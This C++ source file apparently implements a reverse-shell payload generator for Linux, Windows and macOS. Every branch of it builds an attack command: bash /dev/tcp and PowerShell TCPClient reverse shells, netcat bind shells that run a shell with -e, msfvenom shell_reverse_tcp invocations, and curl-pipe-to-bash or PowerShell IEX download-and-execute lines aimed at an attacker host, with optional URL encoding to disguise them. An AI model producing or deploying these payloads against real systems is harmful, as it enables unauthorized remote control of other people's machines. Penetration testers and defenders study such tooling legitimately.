#include "PayloadFactory.h"
#include "../listeners/ListenerFactory.h"
#include <sstream>
#include <iomanip>
#include <algorithm>

PayloadFactory::PayloadFactory() {
    // Register payload types - you can add more here
    // registry_["bash"] = std::make_unique<BashPayload>();
    // registry_["sh"] = std::make_unique<ShPayload>();
    // registry_["zsh"] = std::make_unique<ZshPayload>();
    // registry_["powershell"] = std::make_unique<PowershellPayload>();
    // etc.
}

std::vector<std::string> PayloadFactory::available() const {
    std::vector<std::string> names;
    names.reserve(registry_.size());
    for (const auto& kv : registry_) {
        names.push_back(kv.first);
    }
    return names;
}

std::string PayloadFactory::generateByType(const Options& opts) const {
    std::string payload;
    
    // Generate based on platform and payload type
    switch (opts.platform) {
        case Platform::LINUX:
            payload = generateLinuxPayload(opts);
            break;
        case Platform::WINDOWS:
            payload = generateWindowsPayload(opts);
            break;
        case Platform::MAC:
            payload = generateMacPayload(opts);
            break;
    }
    
    // Apply encoding
    return applyEncoding(payload, opts);
}

std::string PayloadFactory::generateLinuxPayload(const Options& opts) const {
    std::string shell = opts.interpreter.empty() ? "bash" : opts.interpreter;
    
    switch (opts.payloadType) {
        case PayloadType::REVERSE:
            // Example: bash -i >& /dev/tcp/IP/PORT 0>&1
            return shell + " -i >& /dev/tcp/" + opts.host + "/" + std::to_string(opts.port) + " 0>&1";
            
        case PayloadType::BIND:
            // Example: nc -lvnp PORT -e /bin/bash
            return "nc -lvnp " + std::to_string(opts.port) + " -e /bin/" + shell;
            
        case PayloadType::MSFVENOM:
            // Example: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf
            return "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + opts.host + 
                   " LPORT=" + std::to_string(opts.port) + " -f elf";
                   
        case PayloadType::HOAXSHELL:
            // Example: curl -s IP:PORT/shell | bash
            return "curl -s " + opts.host + ":" + std::to_string(opts.port) + "/shell | " + shell;
    }
    return "";
}

std::string PayloadFactory::generateWindowsPayload(const Options& opts) const {
    switch (opts.payloadType) {
        case PayloadType::REVERSE:
            // Example: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT)..."
            return "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + 
                   opts.host + "'," + std::to_string(opts.port) + ");$stream = $client.GetStream()...\"";
                   
        case PayloadType::BIND:
            // Example: nc -lvnp PORT -e cmd.exe
            return "nc -lvnp " + std::to_string(opts.port) + " -e cmd.exe";
            
        case PayloadType::MSFVENOM:
            // Example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe
            return "msfvenom -p windows/x64/shell_reverse_tcp LHOST=" + opts.host + 
                   " LPORT=" + std::to_string(opts.port) + " -f exe";
                   
        case PayloadType::HOAXSHELL:
            // Example: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/shell')"
            return "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + 
                   opts.host + ":" + std::to_string(opts.port) + "/shell')\"";
    }
    return "";
}

std::string PayloadFactory::generateMacPayload(const Options& opts) const {
    std::string shell = opts.interpreter.empty() ? "bash" : opts.interpreter;
    
    switch (opts.payloadType) {
        case PayloadType::REVERSE:
            // Example: bash -i >& /dev/tcp/IP/PORT 0>&1
            return shell + " -i >& /dev/tcp/" + opts.host + "/" + std::to_string(opts.port) + " 0>&1";
            
        case PayloadType::BIND:
            // Example: nc -lvnp PORT -e /bin/bash
            return "nc -lvnp " + std::to_string(opts.port) + " -e /bin/" + shell;
            
        case PayloadType::MSFVENOM:
            // Example: msfvenom -p osx/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho
            return "msfvenom -p osx/x64/shell_reverse_tcp LHOST=" + opts.host + 
                   " LPORT=" + std::to_string(opts.port) + " -f macho";
                   
        case PayloadType::HOAXSHELL:
            // Example: curl -s IP:PORT/shell | bash
            return "curl -s " + opts.host + ":" + std::to_string(opts.port) + "/shell | " + shell;
    }
    return "";
}

std::string PayloadFactory::applyEncoding(const std::string& payload, const Options& opts) const {
    switch (opts.encoding) {
        case Encoding::BASE64:
            return base64Encode(payload);
        case Encoding::URL:
            return urlEncode(payload);
        case Encoding::DOUBLE_URL:
            return doubleUrlEncode(payload);
        case Encoding::NONE:
        default:
            return payload;
    }
}

std::string PayloadFactory::base64Encode(const std::string& input) const {
    // TODO: Implement base64 encoding
    // You can use a library like boost::beast::detail::base64 or implement your own
    return "echo '" + input + "' | base64";
}

std::string PayloadFactory::urlEncode(const std::string& input) const {
    std::ostringstream encoded;
    encoded.fill('0');
    encoded << std::hex;
    
    for (char c : input) {
        if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded << c;
        } else {
            encoded << '%' << std::setw(2) << std::uppercase << static_cast<unsigned char>(c);
        }
    }
    
    return encoded.str();
}

std::string PayloadFactory::doubleUrlEncode(const std::string& input) const {
    return urlEncode(urlEncode(input));
}

std::vector<std::string> PayloadFactory::getSupportedShells() const {
    return {"bash", "sh", "zsh", "/bin/sh", "/bin/bash", "dash", "ksh"};
}

std::vector<std::string> PayloadFactory::getSupportedEncodings() const {
    return {"none", "base64", "url", "double_url"};
}

std::string PayloadFactory::listener(const std::string& type, const Options& opts) const {
    // Use existing ListenerFactory
    ListenerFactory listenerFactory;
    IListener* listener = listenerFactory.get(opts.listenerType);
    
    if (!listener) {
        // Default fallback
        return "nc -lvnp " + std::to_string(opts.port);
    }
    
    return listener->command(opts);
}